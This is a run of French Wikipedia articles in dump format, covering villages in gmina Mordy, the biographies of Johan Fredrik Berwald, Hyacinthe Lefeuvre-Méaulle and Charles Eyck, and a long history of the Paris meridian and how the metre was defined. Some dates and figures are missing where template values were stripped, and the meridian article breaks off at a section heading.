Stok Ruski (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ à l'ouest de Mordy (siège de la gmina), au nord-est de Siedlce (siège de le powiat) et à à l'est de Varsovie (capitale de la Pologne).
Le village comptait approximativement une population de 218 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980304" url="https://fr.wikipedia.org/wiki?curid=8980304" title="Johan Fredrik Berwald">
Johan Fredrik Berwald

Johan Fredrik Berwald, né le à Stockholm et y décédé le est un compositeur suédois.
Biographie.
Johan Fredrik Berwald est un enfant prodige du violon. Dès l'âge de six ans, il effectue des tournées à l'étranger avec son père Georg Johann Abraham Berwald, un bassoniste au Kungliga Hovkapellet (Orchestre royal suédois). Pendant quatre ans, à partir de 1808, il est soliste à la chapelle royale de Saint-Pétersbourg. En 1814, il est violoniste au Kungliga Hovkapellet à Stockholm et chef d'orchestre de l'orchestre royal de 1823 à 1847. Pendant ce temps, il dirige également des concerts de la Société harmonique.
Contrairement à son cousin Franz Berwald, Johan Fredrik réussit en tant que musicien de son vivant. Les cousins étaient parfois rivaux, et Johan Fredrik ne fait, autant que l'on sache, aucun effort pour aider Franz à promouvoir ses œuvres scéniques et symphoniques. Il est considéré comme un chef d'orchestre moyen mais correct en tant que compositeur. Il a fait connaître Carl Maria von Weber et les opéras de Meyerbeer, en partie grâce à la cantatrice Jenny Lind.
Il compose des pièces spécialement pour Jenny Lind, par exemple "En majdag i Värend" (1843), sorte de chant national et populaire dans un style apprécié à l'époque. Il compose aussi de la musique orchestrale et de chambre ainsi que de la musique vocale. On lui doit des quatuors à cordes et concertos pour violon, un quintette à cordes, des œuvres orchestrales, des sonates pour violon, des cantates et des romances. Aucune de ses œuvres n'est aujourd'hui au répertoire.
Il épouse à la chanteuse de cour (« Hovsångare ») Mathilda Cohn. Leur fille Julie Berwald (1822-1877) est chanteuse à l'Opéra royal de Stockholm où elle fait ses débuts en 1847, mais qu'elle quitte en 1852 quand elle épouse le baron Knut Åkerhjelm.
Berwald est élu membre de l'Académie royale de musique de Suède le .

</doc>
<doc id="8980307" url="https://fr.wikipedia.org/wiki?curid=8980307" title="Hyacinthe Lefeuvre-Méaulle">
Hyacinthe Lefeuvre-Méaulle

Hyacinthe-Aristide Lefeuvre-Méaulle (Rennes, - Genève, ) est un diplomate français.
Biographie.
Jeunesse et études.
Hyacinthe Aristide Lefeuvre-Méaulle né le à Belleville en Saint-Hélier, quartier de Rennes (Ille-et-Vilaine). Il est le fils de Florent Jean Marie Charles Lefeuvre, notaire à Rennes, et de Léonide Marie Josèphe Méaulle dont le père Hyacinthe-Charles Méaulle était avocat à Rennes.
Il effectue des études de droit et obtient une licence de droit. Il fréquente l'École libre des sciences politiques.
Il se marie en premières noces avec Florence Woolley, fille de Herbert Lenton Woolley, au couvent de Norwood à Londres après obtention d'une dispense pour différence de religion approuvée par le ministre des affaires étrangères mais Florence meurt le et est inhumée au cimetière de Samois-sur-Seine. Il épouse alors en secondes noces avec Pauline Marie Caroline Tuckerman, fille de Ernest Tuckerman et de Antonie Julie Pauline Petrowski, veuve d'Alfred Durand, née à Prague le (déclaration sous serment faite par elle à Paris le ). Son mariage est célébré à Samois-sur-Seine le . À ce moment-là il est consul général de France, officier de la Légion d'Honneur et demeure 13 rue de la Trémoïlle à Paris. 
Parcours professionnel.
Sous-lieutenant de réserve d'artillerie, entré au ministère des Affaires Étrangères le , il passe vingt ans de services à l'étranger dont six hors d'Europe. 
Attaché à la Direction Politique (), au consulat de France à Kobé (Japon) (), à l'ambassade de France à Saint-Pétersbourg () et au consulat de France à Chicago (), il est nommé Chancelier de le .
Attaché au cabinet du Ministre (), Vice-consul de France à Bangkok () puis à Novorossiisk dans le Caucase (), il devient rédacteur au cabinet du Ministre le .
Consul de au , il est fait Chevalier du mérite agricole le et Chevalier de la Légion d’Honneur, le . Il est ensuite nommé consul de France à Dublin () puis consul de France de le .
Attaché commercial de France pour les Pays du Levant (en Orient) le , Consul de première classe depuis le , il devient Officier de la Légion d’Honneur le et termine sa carrière comme Ministre plénipotentiaire à Santiago du Chili de 1920 à 1924.
Il meurt à Genève le et est inhumé à Samois-sur-Seine (Seine-et-Marne) dans l’ancien cimetière (carré Q – emplacements 20 et 20 bis).

</doc>
<doc id="8980308" url="https://fr.wikipedia.org/wiki?curid=8980308" title="Suchodół Wielki">
Suchodół Wielki

Suchodół Wielki (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ à l'est de Mordy (siège de la gmina), à l'est de Siedlce (siège de le powiat) et à à l'est de Varsovie (capitale de la Pologne).
Le village comptait approximativement une population de 45 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980309" url="https://fr.wikipedia.org/wiki?curid=8980309" title="Cornudet des Chaumettes">
Cornudet des Chaumettes



</doc>
<doc id="8980311" url="https://fr.wikipedia.org/wiki?curid=8980311" title="Davy de la Pailleterie">
Davy de la Pailleterie



</doc>
<doc id="8980313" url="https://fr.wikipedia.org/wiki?curid=8980313" title="Suchodołek">
Suchodołek

Suchodołek (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village comptait approximativement une population de 76 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980314" url="https://fr.wikipedia.org/wiki?curid=8980314" title="Indian Shores">
Indian Shores

Indian Shores est une ville du comté de Pinellas dans l'État de Floride, aux États-Unis.
Démographie.
Au recensement de 2010, elle comptait .

</doc>
<doc id="8980315" url="https://fr.wikipedia.org/wiki?curid=8980315" title="Wielgorz">
Wielgorz

Wielgorz (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au sud-ouest de Mordy (siège de la gmina), à l'est de Siedlce (siège de le powiat) et à à l'est de Varsovie (capitale de la Pologne).
Le village comptait approximativement une population de 207 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980318" url="https://fr.wikipedia.org/wiki?curid=8980318" title="Wojnów (Mazovie)">
Wojnów (Mazovie)

Wojnów (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ à l'est de Mordy (siège de la gmina), à l'est de Siedlce (siège de le powiat) et à à l'est de Varsovie (capitale de la Pologne).
Le village comptait approximativement une population de 231 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980319" url="https://fr.wikipedia.org/wiki?curid=8980319" title="Wojnów">
Wojnów

En Pologne, Wojnów peut désigner :

</doc>
<doc id="8980320" url="https://fr.wikipedia.org/wiki?curid=8980320" title="Conseil général (France)">
Conseil général (France)



</doc>
<doc id="8980321" url="https://fr.wikipedia.org/wiki?curid=8980321" title="Ivan Kral">
Ivan Kral



</doc>
<doc id="8980325" url="https://fr.wikipedia.org/wiki?curid=8980325" title="Coati des montagnes">
Coati des montagnes



</doc>
<doc id="8980331" url="https://fr.wikipedia.org/wiki?curid=8980331" title="Combat de Sidi Aïch">
Combat de Sidi Aïch



</doc>
<doc id="8980334" url="https://fr.wikipedia.org/wiki?curid=8980334" title="Conseil général des jeunes">
Conseil général des jeunes



</doc>
<doc id="8980339" url="https://fr.wikipedia.org/wiki?curid=8980339" title="Wólka Soseńska">
Wólka Soseńska

Wólka Soseńska (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au sud-est de Mordy (siège de la gmina), à l'est de Siedlce (siège de le powiat) et à à l'est de Varsovie (capitale de la Pologne).
Le village comptait approximativement une population de 109 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980341" url="https://fr.wikipedia.org/wiki?curid=8980341" title="Radio-monaco.com">
Radio-monaco.com



</doc>
<doc id="8980344" url="https://fr.wikipedia.org/wiki?curid=8980344" title="Wólka-Biernaty">
Wólka-Biernaty

Wólka-Biernaty (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village comptait approximativement une population de 79 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie.

</doc>
<doc id="8980348" url="https://fr.wikipedia.org/wiki?curid=8980348" title="Wyczółki (Siedlce)">
Wyczółki (Siedlce)

Wyczółki (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au sud-ouest de Mordy (siège de la gmina), à l'est de Siedlce (siège de le powiat) et à à l'est de Varsovie (capitale de la Pologne).
Le village comptait approximativement une population de 202 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980350" url="https://fr.wikipedia.org/wiki?curid=8980350" title="Charles Eyck">
Charles Eyck

Charles Eyck né le à Meerssen et mort le à Schimmert est un peintre et sculpteur néerlandais.
Avec Henri Jonas et Joep Nicolas, il a été un pionnier de l’École de Limbourg.
Biographie.
Charles Eyck a étudié l'art monumental, comme la peinture murale, le vitrail, la grisaille sur verre opalin, à l'Académie d'État à Amsterdam. Auparavant, il avait commencé comme peintre à la faïencerie Céramique de Maastricht.
Il obtient le prix royal de peinture en 1920 et le prix de Rome néerlandais en peinture en 1922. Il expose sa toile "Femme suédoise" au Salon d'automne de 1928. 
Après un court séjour en Suède, au Curaçao, dans le sud de France, Amsterdam, Clamart et Utrecht, il s’installe à Schimmert.
Il a été critiqué parce qu'il persistait dans le genre religieux. En partie à cause de ces critiques et sa surdité croissante, il vivait de plus en plus dans l'isolement dans la maison qu'il dessina lui-même "Ravensbos" à Schimmert.
Charles Eyck meurt le à Schimmert. 

</doc>

<doc id="568221" url="https://fr.wikipedia.org/wiki?curid=568221" title="Méridien de Paris">
Méridien de Paris

Le méridien de Paris est le méridien passant par le centre de l'Observatoire de Paris. Il est situé à 2°20'13,82" à l'est de celui de Greenwich (conventionnellement, la valeur adoptée par l'IGN est de 2°20'14,025"). L'importance historique et scientifique du méridien de Paris est liée aux mesures d'arc de méridien qui lui correspondent : les mesures de la Méridienne de France. Ces mesures sont à l'origine du développement de la géodésie, ainsi que de la définition historique du mètre.
Définition du méridien de Paris et de la Méridienne de France.
Le méridien de Paris définit l'ensemble des points situés sur une ligne imaginaire reliant le pôle Nord au pôle Sud à la longitude de l'observatoire de Paris. La Méridienne de France correspond à une ligne réelle déterminée au moyen de triangulation géodésique et de mesures astronomiques suivant le méridien de Paris. La Méridienne de France a été mesurée à plusieurs reprises au cours de l'histoire de la géodésie.
Histoire.
L'histoire de la mesure de la Méridienne de France traverse trois siècles, du règne de Louis XIV lors de la fondation de l'Observatoire de Paris, un an après la création de l'Académie des sciences en 1666, jusqu'à la mesure de la nouvelle méridienne de France, initiée par François Perrier sous la Troisième République de 1870 à 1888. Cette dernière période correspond à la création des institutions de la Convention du Mètre. La particularité du méridien de Paris réside dans le fait que sa détermination par des observations astronomiques a été complétée dès son origine par des mesures de triangulation géodésique. Avec la création de l'Académie royale des sciences de Paris, la géodésie se développe sous l'impulsion des astronomes français avec le double objectif d'établir la carte de France et de déterminer la taille et la forme de la Terre (la figure de la Terre). Ces dernières données sont à l'époque nécessaires au calcul de la distance de la Terre au Soleil, distance qui est à l'origine de l'unité astronomique dont la valeur actuelle est de mètres. En 1672, profitant du passage de Mars à proximité de la Terre, Jean Richer à Cayenne, Jean-Dominique Cassini et Jean Picard à Paris observent la parallaxe de Mars et font une première mesure de la distance de la Terre au Soleil. Selon leurs observations et leurs calculs (basés sur les lois de Kepler), la distance de la Terre au Soleil est de rayons terrestres. Ainsi, jusqu'à l'invention de nouvelles méthodes de mesure des distances séparant les astres, la détermination de la figure de la Terre revêt une importance primordiale en astronomie, dans la mesure où le diamètre de la Terre est l'unité à laquelle toutes les distances célestes doivent être rapportées. De plus, la Méridienne de France est en rapport avec l'histoire de la cartographie du Royaume-Uni, de l'Espagne et de l'Algérie.
La carte de France et la connexion des observatoires de Paris et Greenwich.
Le méridien de Paris est défini le par les mathématiciens de l'Académie. En ce jour de solstice d'été ceux-ci tracent sur le sol le méridien puis les autres directions nécessaires à l’implantation exacte du futur Observatoire de Paris. Dès lors, la France est dotée de deux méridiens d'origine. En effet, Louis XIII avait déterminé en 1634 que le premier méridien des cartes maritimes passerait par l'île de Fer, l'île la plus occidentale de l'archipel des Canaries. En 1669, l'abbé Picard mesure un arc de méridien, afin de mesurer la Terre et dans le but défini par Colbert de cartographier la France de façon géométrique. La région choisie se trouve à l'est de Paris, entre Malvoisine et Sourdon-Amiens. En 1683, Louis XIV ordonne aux mathématiciens de l'Académie des Sciences de continuer l'entreprise et de prolonger la méridienne vers le nord et le sud jusqu'aux frontières du royaume. Les travaux débutent la même année. Jean-Dominique Cassini (dit Cassini I), chargé des opérations, se dirige vers le Sud et de La Hire part vers le Nord. Après la mort de Colbert (), les travaux s'arrêtent, reprennent en 1700-1701, avec, pour aider son père la participation de Jacques Cassini (Cassini II). Ils s'arrêtent de nouveau pour n'être repris et terminés qu'en 1718 par Jacques Cassini, Maraldi et le fils de La Hire.
Dans les années 1739-1740, César-François Cassini (dit Cassini III ou Cassini de Thury) et l'Abbé de la Caille rectifient le tracé. Ces travaux, complétés par des mesures en Laponie et en Équateur, permettent de confirmer l’aplatissement de la Terre aux pôles, contrairement aux mesures de Jean-Dominique Cassini (dit Cassini I) et de Jacques Cassini (dit Cassini II) mais conformément à la théorie de Newton.
En 1783, l'achèvement de la triangulation, nécessaire à la réalisation de la Carte particulière et générale de la France, débutée en 1747 permet à César-François Cassini d'envisager d'étendre le réseau géodésique français en Angleterre. Cette année-là, l'Académie des sciences fait parvenir au roi George III un mémoire dans lequel César-François Cassini expose son projet de relier les observatoires de Paris et de Greenwich. La connexion à l'observatoire de Greenwich en 1787 et la triangulation de la Grande-Bretagne proposée par le général William Roy prolongent le réseau de triangulation franco-anglais jusqu'aux Iles Shetland. La triangulation principale de la Grande-Bretagne est conduite de 1791 à 1853 par le Board of Ordnance et dirigée par Isaac Dalby, William Mudge et Thomas Frederik Colby. Le rapport et la synthèse finale sont réalisés par Alexander Ross Clarke en 1858.
Du côté français, la jonction est conduite par Jean-Dominique Cassini (dit Cassini IV), Adrien-Marie Legendre, et Pierre François André Méchain. Le travail est effectué indépendamment par les deux nations avec leurs instruments respectifs. Les français utilisent le cercle répétiteur réalisé par Étienne Lenoir (1744-1832) et conçu par Jean-Charles de Borda. L'amélioration de la précision de l'instrument par comparaison à celle obtenue par le quart de cercle mobile conduira à reprendre la mesure de la Méridienne de France.
En 1823-1825, François Arago et Henry Kater reprendront la connexion des observatoires de Greenwich et Paris.
La connexion des triangulations du Royaume-Uni et de la France sera reprise une troisième fois en 1861-1862 à nouveau de manière indépendante par les Anglais (Alexander Ross Clarke) et les français (François Perrier et Beaux sous la direction du colonel Levret).
De la définition du mètre à la Conférence générale des poids et mesures de 1889.
La méridienne est mesurée à nouveau entre Dunkerque et Barcelone de 1792 à 1798 par Jean-Baptiste Joseph Delambre et Pierre Méchain pour servir de base à la détermination de la longueur du mètre en 1799. François Arago et Jean-Baptiste Biot publient en 1821 un quatrième volume complétant l'œuvre de Delambre et Méchain dans lequel ils déterminent la variation de la pesanteur et des degrés terrestres sur le prolongement du Méridien de Paris allant jusqu'aux îles Baléares au sud et aux îles Shetland au nord. Dans l'introduction de cet ouvrage, Arago projette le prolongement de la Méridienne de France jusqu'en Algérie par la triangulation géodésique de l'Espagne et de l'Algérie, puis par leur jonction par-dessus la Méditerranée.
En 1853, le Gouvernement espagnol décide de la mise en œuvre d'une grande carte topographique de l'Espagne. Carlos Ibáñez e Ibáñez de Ibero et Carlos Saavedra Menesès sont désignés pour en effectuer les travaux préparatoires. En effet, tout l'outillage scientifique et technique nécessaire à cette entreprise est à créer. Les règles géodésiques conçues et utilisées au et au début du par Borda ou Bessel sont dépassés par l'utilisation de systèmes de lecture au microscope.
L'Espagne ayant adopté le système métrique depuis 1849, Carlos Ibáñez e Ibáñez de Ibero se rend à Paris avec Carlos Saavedra Menesès pour faire construire une règle de leur conception par Brunner, afin de mesurer la base géodésique centrale d'Espagne.
De 1858 à 1877, Carlos Ibáñez e Ibáñez de Ibero, qui dirigera l'Institut Géographique d'Espagne dès sa fondation en 1870, conduit les opérations de triangulation de l'Espagne. Entre 1870 et 1894, François Perrier, puis Jean-Antonin-Léon Bassot procèdent à la mesure de la nouvelle méridienne de France en métropole et en Algérie. En 1879, François Perrier pour la France et Carlos Ibáñez e Ibáñez de Ibero pour l'Espagne réalisent les travaux de jonction géodésique de l'Espagne avec l'Algérie en observant depuis des stations d'altitude des triangles allant jusqu'à de longueur et complètent ainsi la mesure de la Méridienne de France par-dessus la Méditerranée, conformément au projet formulé par Biot et Arago. François Perrier annonce à l'Académie en : "Désormais, la Science possède un arc méridien de 27°, le plus grand qui ait été mesuré sur la Terre et projeté astronomiquement sur le ciel". Le point fondamental de la Nouvelle Méridienne de France est le Panthéon. Toutefois, le réseau géodésique ne suit pas exactement le méridien. Il dérive parfois à l'Est et parfois à l'Ouest. Selon Friedrich Robert Helmert, le méridien de Greenwich est plus proche de la moyenne des mesures que le méridien de Paris.
Les travaux géodésiques menés en France s'associent également à ceux menés en Europe centrale. En 1860, le gouvernement russe, à la demande d'Otto Wilhelm von Struve, invite les gouvernements de Belgique, de France, de Prusse et d'Angleterre à connecter leur triangulation dans le but de mesurer la longueur d'un arc de parallèle à la latitude de 52° afin de vérifier les dimensions et la figure de la Terre telles qu'elles ont été déduites des mesures d'arc de méridien.
Il s'avère nécessaire de comparer les règles géodésiques utilisées dans chaque pays afin de combiner les mesures effectuées. Le gouvernement britannique invite la France, la Belgique, la Prusse, la Russie, l'Inde, l'Australie, l'Espagne, les États-Unis et la Colonie du Cap à envoyer leur règle géodésique au bureau de l'Ordnance Survey à Southampton. Les standards d'Espagne et des États-Unis sont basés sur le système métrique. Les règles de Russie, de Prusse et de Belgique sont calibrées sur la toise. Alexander Ross Clarke et Henry James publient leurs premiers résultats en 1867.La même année, la Russie, le Portugal et l'Espagne adhèrent à l'Association pour la mesure des degrés en Europe (qui deviendra l'Association internationale de Géodésie) dont la France deviendra membre en 1871. Lors de sa seconde conférence générale en 1867, l'association recommande l'adoption du mètre comme unité standard de longueur internationale. La pétition que l'association adresse aux différents états qui y sont représentés donnera lieu à la création en 1870 d'une Commission internationale du Mètre, puis à la Convention du Mètre en 1875. En 1875, le Congrès de l'Association pour la mesure des degrés en Europe réuni à Paris sous la présidence de Carlos Ibáñez e Ibáñez de Ibero décide la création d'une règle géodésique internationale pour la mesure des bases. Ainsi, le mètre, dont la définition historique est liée à la mesure de la longueur du méridien de Paris par Delambre et Méchain au , est choisi par l'Association internationale de Géodésie comme unité internationale de longueur au .
En 1879, la jonction géodésique de l'Europe avec l'Afrique couronne la collaboration scientifique franco-espagnole initiée lors de la mission du Pérou (Vice-Royaume du Pérou, actuel Équateur) de 1735 à 1744. Cette consécration illustre l'importance de la création d'une unité internationale standard de longueur et confirme les avantages du système décimal français qui est également utilisé en Espagne.
Les géodésiens qui ont suggéré la création de la Commission internationale du Mètre s'engagent activement dans les institutions de la Convention du Mètre. Ainsi, on retrouve parmi les membres du Comité international des poids et mesures de nombreux membres de l'Association internationale de Géodésie. Le général Carlos Ibáñez e Ibáñez de Ibero préside les deux institutions pendant la période de leur organisation. De 1889 à 1960, le mètre sera défini par un prototype international en platine iridié, dont une copie est distribuée à chaque état signataire de la Convention du mètre, et dont un exemplaire est encore conservé au pavillon de Breteuil dans les conditions fixées en 1889.
Le système international d'unités (SI) actuellement en vigueur est le résultat de l'évolution du système métrique établi en 1889 lors de la première Conférence générale des poids et mesures. La définition actuelle du mètre est la longueur du trajet parcouru dans le vide par la lumière pendant une durée de 1/299 792 458 de seconde. Tandis que celle de la seconde est la durée de périodes de la radiation correspondant à la transition entre les deux niveaux hyperfins de l'état fondamental de l'atome de césium 133. Grâce à ces définitions, le mètre étalon est invariable et reproductible en tout temps et tous lieux et ne renferme rien de particulier à aucun peuple.
L'heure : de 1883 au Temps Universel Coordonné.
En 1883, lors de la Conférence générale de l'Association internationale de Géodésie à Rome, l'adoption du méridien de Greenwich comme méridien d'origine est proposée dans l'espoir que le Royaume-Uni adhérera à la Convention du Mètre. Le méridien de Greenwich est adopté lors de la conférence internationale de Washington de 1884.
Greenwich l'emporte pour deux raisons principales. D'une part, les deux tiers de la flotte mondiale (dont la marine américaine) utilisent déjà le méridien de Greenwich. D'autre part, le système de fuseaux horaires, basés sur le méridien de Greenwich, adopté aux États-Unis par les compagnies ferroviaires l'année précédente est jugé parfaitement satisfaisant. En effet, l'adoption d'un méridien d'origine n'a pas pour seul but d'unifier les coordonnées géographiques. Elle vise surtout à organiser les références temporelles.
Au , le développement des transports ferroviaires rend nécessaire l'uniformisation de l'heure dans les pays industrialisés. La nécessité s'en fait ressentir de manière particulièrement pressante aux États-Unis où le décalage horaire entre la côte Est et la côte Ouest est d'environ quatre heures. En 1883, le système des fuseaux horaires, réglés sur Greenwich, y est introduit à la suite de la "General Time Convention" de Chicago où sont regroupés les délégués des 35 réseaux ferroviaires du Canada et du Nord des États-Unis et à la "Southern Time convention" de New York où sont réunis les délégués des 34 compagnies des États du Sud.
Jusqu'en 1891, l'heure n'est pas unifiée en France. Avec l’essor du rail en France, on passe progressivement d'une situation dans laquelle chaque ville vit au temps solaire moyen à l'adoption généralisée de l'heure de Paris. La loi du fixe l'heure en France et en Algérie à l'heure du temps moyen de Paris.
Au début du , la France adopte l'heure du méridien international de Greenwich avec la loi du , (publiée au Journal officiel du , page 1882 ). Toutefois, le texte de loi ne fait pas référence au méridien de Greenwich, mais au « temps moyen de Paris retardé de 9 minutes et 21 secondes ».
Du point de vue technique et scientifique, à cette époque, le développement de la télégraphie sans fil laisse entrevoir la possibilité d'unifier le Temps Universel. À partir de 1910, les pendules astronomiques de l'Observatoire de Paris envoient quotidiennement l'heure en mer par les antennes de la Tour Eiffel dans un rayon de . À la suite d'un rapport de Gustave Ferrié, le Bureau des longitudes organise à l'Observatoire de Paris une Conférence internationale de l'heure radiotélégraphique en 1912. Le Bureau international de l'heure est créé et installé dans les locaux de l'Observatoire de Paris. En raison de la Première Guerre mondiale, la Convention internationale ne sera jamais ratifiée. En 1919, l'existence du Bureau International de l'Heure est officialisée sous l'autorité d'une Commission Internationale du Temps, sous l'égide de l'Union astronomique internationale, créée par Benjamin Baillaud. Le Bureau International de l'Heure sera dissous en 1987 et ses tâches seront réparties entre le Bureau international des poids et mesures et le Service international de la rotation terrestre et des systèmes de référence (IERS).
Jusqu'en 1929, seule la détermination astronomique du Temps universel effectuée à l'Observatoire de Paris est utilisée. Cette réalisation du Temps Universel est appelée heure demi-définitive et sera publiée jusqu'en 1966 par le Bureau international de l'heure.
En 1936, les irrégularités de la vitesse de rotation de la Terre dues à des déplacements de masses d'air et d'eau imprévisibles sont découvertes grâce à l'utilisation d'horloges à quartz. Elles impliquent que la rotation de la Terre est un moyen peu précis pour déterminer le temps. En conséquence, la définition de la seconde, d'abord considérée comme une fraction du temps de rotation de la Terre sur elle-même, évolue et devient une fraction du temps de révolution de la Terre autour du Soleil. Enfin dès 1967, la seconde est définie par des horloges atomiques. L'échelle de Temps qui en découle est le Temps atomique international (TAI). Actuellement, il est établi à partir de plus de 200 horloges atomiques réparties dans plus de 50 laboratoires nationaux par le Bureau International des Poids et Mesures.
Le service international de la rotation terrestre et des systèmes de référence joue également un rôle essentiel dans le Temps universel coordonné (UTC) en décidant de l'insertion éventuelle d'une seconde intercalaire afin que celui-ci soit gardé en concordance avec la rotation de la Terre qui est soumise à des variations irrégulières. Le Temps Universel Coordonné est l'échelle de temps internationale.
Par le décret du , la France règle son heure sur le Temps universel coordonné (UTC). Comme la majorité des pays de l'Union Européenne, la France métropolitaine est réglée sur le fuseau horaire qui correspond au méridien situé à 15° à l'Est du méridien origine et qui traverse la Suède, le premier pays européen à avoir adopté ce méridien, plutôt que celui de sa capitale, pour unifier son heure nationale.
Le méridien dans la ville de Paris et en France.
L'histoire du méridien de Paris est commémorée par plusieurs monuments outre la salle méridienne de l'Observatoire de Paris.
Les mires.
À l'origine, les mires servent à orienter les instruments astronomiques de l'Observatoire de Paris dans le plan méridien. Elles sont donc placées sur le passage du méridien correspondant à l'emplacement des instruments astronomiques. Elles sont au nombre de deux. La mire du Nord à Montmartre et la mire du Sud dans le parc Montsouris.
La mire du Nord.
Les premières observations faites pour déterminer la position de la mire du Nord remontent à 1673. Deux ans plus tard, en 1675, un gros pilier de bois, le poteau de la méridienne, est planté pour marquer la direction du Nord depuis le centre de l'Observatoire. À l'emplacement de ce repère, la mire du Nord est érigée en 1736. Actuellement, elle est située dans le parc (privé) du Moulin de la Galette et est entièrement entourée de constructions. Un décret du autorise la ville de Paris à l'acquérir. Elle est classée au titre des monuments historiques en 1934.
Elle porte l'inscription suivante : « L'an MDCCXXXVI cet obélisque a été élevé par ordre du Roi pour servir d'alignement à la méridienne de Paris du côté Nord. Son axe est à 2931 toises deux pieds de la face méridionale de l'Observatoire ».
La mire du Sud.
Jusqu'en 1782, pour orienter le quart de cercle mobile au Sud, on pointe le château de l'Hay. Toutefois, cette année-là, la construction d'une remise masque cette mire. Cassini de Thury fait établir au bord de cette remise un poteau à environ 1000 toises de l'Observatoire. Ce poteau est remplacé par la Mire du Sud ou Mire de Montsouris, achevée en 1806 par Antoine Vaudoyer au même emplacement, dans la plaine de Montrouge, à environ de l'Observatoire. Lors de l'aménagement du parc Montsouris, la mire du Sud y est intégrée, sans être déplacée. Ce monument haut de quatre mètres est classé.
Sur la stèle on peut lire l'inscription suivante : « Du règne de… (le nom de Napoléon a été gratté) mire de l'Observatoire - MDCCCVI ».Si on se fie à la ligne imaginaire tracée dans le parc par les médaillons de Jan Dibbets (voir ci-dessous), on constate que la Mire du Sud n'est pas dans leur axe. En effet, à l'époque elle sert à l'alignement de la lunette méridienne de l'Observatoire qui ne se trouve pas exactement sur le méridien, mais à à l'est du méridien de Paris.
L'arc de Picard.
Pour mesurer un degré de la longueur de la Méridienne de France (environ entre Malvoisine et Sourdon), Picard s’appuie sur une base géodésique mesurée entre Villejuif et Juvisy. Les extrémités de cette base sont marquées par l'édification de deux pyramides. La pyramide de Cassini est élevée au terme Nord de la base de Picard à Villejuif en 1742. L'extrémité Sud de la base est marquée par la pyramide de Juvisy-sur-Orge, édifiée en 1756 et déplacée vers 1970 en raison de travaux d'élargissement de la route nationale 7.
Les obélisques astronomiques.
En 1736, lors de l'édification de la mire du Nord, à Montmartre, le projet est formulé d'en élever quatre-vingt-quinze autres sur le trajet de la Méridienne de France entre Dunkerque et le Canigou. On n'en dénombre que deux, l'obélisque de Manchecourt et l'obélisque d'Orveau.
L'Hommage à Arago.
135 médaillons de bronze de de diamètre matérialisent depuis 1994 le tracé du méridien dans la ville de Paris. Ils ont été conçus par l'artiste néerlandais Jan Dibbets et portent le nom de François Arago et les indications Nord (N) et Sud (S). Certains de ces médaillons ont disparu. La section de méridien, ainsi matérialisée, s'étend sur de part et d'autre de l'observatoire, dans les , , , , et arrondissements. Un des médaillons a été fixé sur le socle de la statue d' Arago (fondue pendant l'occupation allemande), situé sur le boulevard Arago et la place de l'Île-de-Sein.
La Méridienne verte.
Lors de la célébration de l'an 2000, Paul Chemetov crée le concept de la Méridienne verte. L'idée de jalonner le trajet du méridien de Paris de plantations est déjà émise, en 1936, par Henri Hugon qui s'inspirait de la plantation de hêtres par un prêtre, nommé Lecour, à la fin du , près d'une chapelle dédiée à Saint-Michel sur le trajet du méridien.
Les gnomons ou méridiennes astronomiques.
Au début du naît une controverse au sujet de la variation de l'obliquité de l'écliptique. Les méridiennes astronomiques permettront de mettre en évidence la lente diminution actuelle de l'obliquité de l'écliptique. Ce qui fera dire à Delambre au siècle suivant à propos des gnomons : .
La ligne méridienne de l'Observatoire de Paris.
La salle Cassini située au second étage de l'Observatoire de Paris abrite une grande ligne méridienne. Jean-Dominique Cassini trace cette ligne en 1671. Elle sera achevée entre 1729 et 1733 par son fils Jacques Cassini. Il s'agit d'un instrument astronomique conçu pour étudier la variation de l'obliquité de l'écliptique. Les vingt-cinq années de mesures effectuées entre 1730 et 1755 sont longtemps restées inexploitées. La méridienne de l'Observatoire de Paris est le seul instrument de ce type construit dans un édifice laïc.
Le gnomon de l'église Saint-Sulpice.
